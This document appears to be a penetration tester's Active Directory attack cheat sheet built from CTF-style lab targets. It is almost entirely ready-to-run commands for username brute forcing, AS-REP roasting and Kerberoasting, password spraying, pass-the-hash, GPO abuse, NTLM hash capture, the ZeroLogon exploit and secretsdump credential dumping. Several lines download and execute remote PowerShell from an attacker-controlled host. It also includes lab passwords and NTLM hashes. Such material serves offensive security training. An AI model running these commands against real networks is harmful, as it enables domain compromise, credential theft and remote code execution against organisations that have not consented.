# Active Directory
## No Credentials
### Initial Scans
| Scan Type | Description | Command  |
| -------------------|-----------------------|:----------------------------------------------------------------------|
| LDAP   | Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP  | Domain Enumeration | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip"` |
| LDAP  | Get User account & description field | `ldapsearch -v -x -b "DC=roast,DC=csl" -H "ldap://$ip" \| grep 'sAMAccountName\|description'` |
| LDAP / RPC | Get User accounts | `rpcclient -U% $ip; enumdomusers; enumdomains; enumprivs` |
| User Enumeration | Quick Bruteforce scan for valid usernames | `kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $domain -dc-ip $ip` |
| User Enumeration | Extensive Bruteforce scan for valid usernames | `kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain $domain -dc-ip $ip` |
| User Enumeration | Extensive Bruteforce scan for valid usernames | `kerbrute -users /usr/share/wordlists/names.txt -domain DICTIONARY -dc-ip $ip` |
| Userless RDP session | See who is logged on / lock screen info | `rdesktop -f -u "" $ip` |
| Get Password Policy | `crackmapexec smb $ip --pass-pol -u '' -p ''` |
| Get Hahes if anon access allowed | `GetNPUsers.py $domain/ -format john -outputfile hash` |
| Get Hashes | list and get TGTs for those users without preauth set | `GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash` |
| Crack Hashes | Use John to crack hashes | `john hash --wordlist=/usr/share/wordlists/rockyou.txt ` |
| User Enumerations | Get users from IPC$ share | `python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$ip \| tee users.txt` |

### Brute Force
| Info | Command |
|:-----|:--------|
| WinRM User list & Password list | `crackmapexec winrm -u users.txt -p wordlist.txt -d $domain $ip` |
| SMB User list & Password list | `crackmapexec smb -u users.txt -p passwords.txt -d $domain $ip` |
| Mash user first & last name list | `ctf-wordlist-names.sh users.txt` |

#### Password Generator
```python
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
years = ['2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021']

with open('wordlist.txt', 'w') as wordlist:
    for month in months:
        for year in years:
            password = month + year
            wordlist.write(f'{password}\n')
```

`python3 generator.py`

## Credentials
### Remote Login
| Info | Command |
|:-----|:--------|
| RDP  | `remmina -c rdp://username@$ip` |
| WinRM  | `evil-winrm -i $ip -u $user -p $pass` |
| Psexec | `psexec.py $domain/$user@$ip` |
| RPC | `rpcclient -U $user $ip; enumdomusers; QUERYDISPINFO` |
| SMB | `smbclient //$ip/$share -U "$user"` |
| SMB | `crackmapexec smb -u Potato -p 'W2CUvphqXB' --shares $ip`

### User Scans
| Info | Command |
|:-----|:--------|
| Enumerate other users | `rpcclient -U "izabel" $ip; enumdomusers` |
| Get User account with creds | `GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip` |
| Get User accounts & descriptions with creds | `/opt/pywerview/pywerview.py get-netuser -w toast.csl -u karen -p MANAGER -t $ip \| grep 'samaccountname\|description'`
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| From Userlist (Check if preauthentication is enabled (If not we can steal hashes)) | `GetNPUsers.py $domain/ -no-pass -usersfile users.txt -request` |
| Bloodhound Python | `bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30`
| Kerberoast with Creds | `python2 /opt/impacket/examples/GetUserSPNs.py roast.csl/crhodes -outputfile hash`
| Dump Secrets | `/opt/impacket/examples/secretsdump.py roast.csl/roastsvc@$ip` |
| GetUserSPNs | `python3 /opt/impacket/examples/GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!` |


### SharpHound
| Info | Command |
|:-----|:--------|
| Download sharphound | `echo "certutil.exe -urlcache -f http://$lhost/windows/privesc/SharpHound.exe sharphound.exe" \| cb` |
| Download sharphound (Evil-WinRM) | `upload /home/kali/share/windows/privesc/SharpHound.exe` |
| Start neo4j | `sudo neo4j console` |
| Run Bloodhound | `bloodhound` |

### Remote Python Scan
```python
>>> import ldap3
>>> server = ldap3.Server('$ip', get_info = ldap3.ALL)
>>> connection = ldap3.Connection(server, user='Karen', password='MANAGER')
>>> connection.bind()
True
# Basic Server Info
>>> server.info
# All LDAP Entries
>>> connection.search(search_base='DC=toast,DC=csl', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
```

### Local Scans
#### Get All Objects
Code
```PowerShell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

### Group Policies
| Info | Command |
|:-----|:--------|
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/SharpGPOAbuse.exe` |
| SharpGPO upload (Evil-WinRM) | `upload /root/share/windows/privesc/CommandLine.dll` |
| SharpGPO payload | `.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author SPRAY\administrator --Command "cmd.exe" --Arguments "/c whoami > C:\task.txt" --GPOName "DCPolicy"` |
| Update group policy | `gpupdate /force` |
| Clean up | `New-GPOImmediateTask -Remove -Force -GPODisplayName DCPolicy`

## Exploits
### Pass the Hash
#### Remotely
| Info | Command |
|:-----|:--------|
| crackmapexec | `crackmapexec smb $ip -u $user -H $hash` | 
| psexec | `psexec.py $user@$ip -hashes :$hash` |
| secretsdump | `secretsdump.py $user@$ip -hashes $hash` |
| smbclient | `smbclient //$ip/$share -U $user --pw-nt-hash $hash` |
| WinRM | `evil-winrm -i $ip -u $user -H $hash` |
| wmiexec.py | `wmiexec.py $user@$ip -hashes :$hash` |
| xfreerdp 1 - Disable Restricted admin if required (Need admin) | `cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'` |
| xfreerdp 2 | `xfreerdp /v:$ip /u:$user /pth:$hash` |

#### Locally
| Info | Command |
|:-----|:--------|
| WMIExec 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-WMIExec.ps1` |
| WMIExec 2 - Import Module | `. ./Invoke-WMIExec.ps1` |
| WMIExec 3 - Run Command | `Invoke-WMIExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80 -UseBasicParsing)"' -verbose`
| SMBExec 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBExec.ps1` |
| SMBExec 2 - Import Module | `. ./Invoke-SMBExec.ps1` |
| SMBExec 3 - Run Command | `Invoke-SMBExec -Target dc01 -Domain heist.offsec -Username svc_apache$ -hash 78bc82c952449150a12ad60e870a2be4 -Command 'powershell -ep bypass -Command "iex(iwr http://192.168.49.111:80/pc.ps1 -UseBasicParsing)"' -verbose` |
| SMBEnum 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBEnum.ps1` | 
| SMBEnum 2 - Import Module | `. ./Invoke-SMBEnum.ps1` | 
| SMBEnum 3 - Run Command | `Invoke-SMBEnum -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Target dc01 -verbose` |
| SMBClient 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-SMBClient.ps1` | 
| SMBClient 2 - Import Module | `. ./Invoke-SMBClient.ps1` | 
| SMBClient 3 - Run Command | `Invoke-SMBClient -Domain heist.offsec -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4 -Action Recurse -Source \\dc01.heist.offsec\C$\ -verbose` |
| TheHash 1 - Upload from Evil-WinRM | `upload /home/kali/share/windows/privesc/Invoke-TheHash/Invoke-TheHash.ps1` | 
| TheHash 2 - Import Module | `. ./Invoke-TheHash.ps1` | 
| TheHash 3 - Run Command | `Invoke-TheHash -Type WMIExec -Target dc01 -Username svc_apache$ -Hash 78bc82c952449150a12ad60e870a2be4` |

### GMSAPassword
| Info | Command |
|:-----|:--------|
| Upload GMSAPasswordReader Evil-WinRM | `upload /home/kali/share/windows/privesc/GMSAPasswordReader.exe` | 
| Run GMSAPasswordReader | `.\GMSAPasswordReader.exe --AccountName SVC_APACHE` | 
| Manual PowerShell method step #1 | `$gmsa = Get-ADServiceAccount -Identity 'SVC_APACHE' -Properties 'msDS-ManagedPassword'` |
| Manual PowerShell method step #2 | `$mp = $gmsa.'msDS-ManagedPassword'` |
| Manual PowerShell method step #3 | `$mp -join ','`
| Manual PowerShell method step #4 (On other box) | `(ConvertFrom-ADManagedPasswordBlob <blob>).SecureCurrentPassword | ConvertTo-NTHash`

### NTLM Theft
| Info | Command |
|:-----|:--------|
| Generate files | `python3 /opt/ntlm_theft/ntlm_theft.py --generate all --server 10.10.0.15 --file test234` |
| Start responder to capture hashes | `responder -I tun0` |

### Zero Login
| Info | Command |
|:-----|:--------|
| Run Exploit | `python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC` |
| Dump Secrets | `secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29` |
| Dump Secrest | `/opt/impacket/examples/secretsdump.py roast.csl/roastsvc@$ip` |

### Constrained Delegation
| Info | Command |
|:-----|:--------|
| Get info about the delegation | `findDelegation.py -debug COOCTUS.CORP/password-reset:resetpassword -dc-ip $ip` |
| Get info about the delegation | `python3 /opt/pywerview/pywerview.py get-netuser -u password-reset -p resetpassword -t $ip -d COOCTUS.CORP` |
| Impersonate and get ticket of the Administrator | `getST.py -spn oakley/DC.COOCTUS.CORP -impersonate administrator "COOCTUS.CORP/password-reset:resetpassword" -dc-ip $ip` |
| Export ticket to a variable | `export KRB5CCNAME=administrator.ccache` |
| Dump secrets | `secretsdump.py -k -no-pass DC.COOCTUS.CORP`

